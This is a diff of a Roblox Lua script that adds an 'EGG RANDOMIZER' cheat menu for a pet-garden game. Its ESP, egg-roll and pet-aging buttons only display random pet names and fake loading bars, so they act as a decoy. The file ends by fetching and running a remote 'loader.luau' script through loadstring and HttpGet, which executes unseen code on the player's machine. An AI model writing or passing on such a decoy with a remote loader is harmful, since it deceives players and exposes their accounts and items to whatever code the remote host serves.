@@ -1,2 +1,206 @@
+-- Remove previous GUI
+pcall(function()
+    game.Players.LocalPlayer.PlayerGui.GardenInjectedGUI:Destroy()
+end)
+
+-- Setup
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "GardenInjectedGUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = player:WaitForChild("PlayerGui") -- ✅ Mobile compatible
+
+-- Pet list
+local petNames = {"Dairy Cow", "Jackalope", "Seeding", "Golem", "Golden Goose"}
+
+-- Billboard tracker
+local displayed = {} -- [egg] = BillboardGui
+
+-- Main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 220, 0, 250)
+frame.Position = UDim2.new(0.02, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(139, 69, 19)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+-- Draggable
+local dragging, dragInput, dragStart, startPos
+frame.Active = true
+frame.Selectable = true
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "🐾 EGG RANDOMIZER 🐾"
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.Parent = frame
+
+-- Credit
+local madeBy = Instance.new("TextLabel")
+madeBy.Size = UDim2.new(1, 0, 0, 18)
+madeBy.Position = UDim2.new(0, 0, 0, 30)
+madeBy.BackgroundTransparency = 1
+madeBy.Text = "Made by: Miszua"
+madeBy.Font = Enum.Font.Gotham
+madeBy.TextSize = 14
+madeBy.TextColor3 = Color3.fromRGB(160, 160, 160)
+madeBy.Parent = frame
+
+-- Button creator
+local function createButton(text, yPos)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -20, 0, 36)
+    btn.Position = UDim2.new(0, 10, 0, yPos)
+    btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    btn.BorderSizePixel = 0
+    btn.Text = text
+    btn.Font = Enum.Font.GothamSemibold
+    btn.TextSize = 16
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Parent = frame
+    return btn
+end
+
+-- ESP Toggle Button
+local espOn = false
+local espBtn = createButton("👁 ESP: OFF", 60)
+espBtn.MouseButton1Click:Connect(function()
+    espOn = not espOn
+    espBtn.Text = espOn and "👁 ESP: ON" or "👁 ESP: OFF"
+end)
+
+-- Auto Roll Sprout Egg with Slot Machine Effect
+local rollBtn = createButton("🎲 AUTO ROLL SPROUT EGG", 110)
+rollBtn.MouseButton1Click:Connect(function()
+    local char = player.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and obj.Name:lower():find("egg") and (obj.Position - root.Position).Magnitude <= 25 then
+            -- Clear previous
+            if displayed[obj] then
+                displayed[obj]:Destroy()
+                displayed[obj] = nil
+            end
+
+            -- Billboard GUI
+            local billboard = Instance.new("BillboardGui", gui)
+            billboard.Adornee = obj
+            billboard.Size = UDim2.new(0, 200, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 4, 0)
+            billboard.AlwaysOnTop = true
+
+            local label = Instance.new("TextLabel", billboard)
+            label.Size = UDim2.new(1, 0, 1, 0)
+            label.BackgroundTransparency = 1
+            label.Font = Enum.Font.GothamBold
+            label.TextSize = 20
+            label.TextColor3 = Color3.fromRGB(255, 255, 0)
+
+            displayed[obj] = billboard
+
+            -- Slot machine roll
+            coroutine.wrap(function()
+                for i = 1, 20 do
+                    label.Text = "🎲 " .. petNames[math.random(#petNames)]
+                    task.wait(0.07)
+                end
+                local finalPet = petNames[math.random(#petNames)]
+                label.Text = "✨ " .. finalPet .. " ✨"
+            end)()
+        end
+    end
+end)
+
+-- Auto Age 50 Pet Button
+local autoAgeBtn = createButton("🐶 AUTO AGE 50 PET", 160)
+autoAgeBtn.MouseButton1Click:Connect(function()
+    local loading = Instance.new("Frame", gui)
+    loading.Size = UDim2.new(0, 280, 0, 100)
+    loading.Position = UDim2.new(0.5, 0, 0.5, 0)
+    loading.AnchorPoint = Vector2.new(0.5, 0.5)
+    loading.BackgroundColor3 = Color3.new(0, 0, 0)
+    loading.BackgroundTransparency = 0.2
+    loading.BorderSizePixel = 0
+
+    local text = Instance.new("TextLabel", loading)
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.TextColor3 = Color3.new(1, 1, 1)
+    text.Font = Enum.Font.GothamBold
+    text.TextSize = 20
+    text.TextWrapped = true
+
+    for i = 1, 100 do
+        text.Text = "AUTO AGE 50 PET IS FOR DIVINE ONLY!\nLoading: " .. i .. "%"
+        task.wait(0.05)
+    end
+    loading:Destroy()
+
+    -- Scrollable Pet List
+    local scrollFrame = Instance.new("ScrollingFrame", gui)
+    scrollFrame.Size = UDim2.new(0, 220, 0, 200)
+    scrollFrame.Position = UDim2.new(0.5, -110, 0.5, -100)
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #petNames * 40)
+    scrollFrame.ScrollBarThickness = 6
+    scrollFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    scrollFrame.Active = true
+
+    for i, pet in ipairs(petNames) do
+        local item = Instance.new("TextLabel", scrollFrame)
+        item.Size = UDim2.new(1, -10, 0, 36)
+        item.Position = UDim2.new(0, 5, 0, (i-1) * 40)
+        item.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+        item.BorderSizePixel = 0
+        item.Text = pet
+        item.Font = Enum.Font.GothamSemibold
+        item.TextSize = 16
+        item.TextColor3 = Color3.new(1, 1, 1)
+    end
+end)
+
+-- Version Label
+local versionLabel = Instance.new("TextLabel", frame)
+versionLabel.Size = UDim2.new(1, -20, 0, 22)
+versionLabel.Position = UDim2.new(0.5, -((220 - 20) / 2), 1, -26)
+versionLabel.BackgroundTransparency = 1
+versionLabel.Text = "Version: 2.84"
+versionLabel.Font = Enum.Font.GothamBold
+versionLabel.TextSize = 18
+versionLabel.TextColor3 = Color3.new(1, 1, 1)
+versionLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+
 ID="330c14ec-0ea1-4a26-bf38-bbda5bea88e8";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
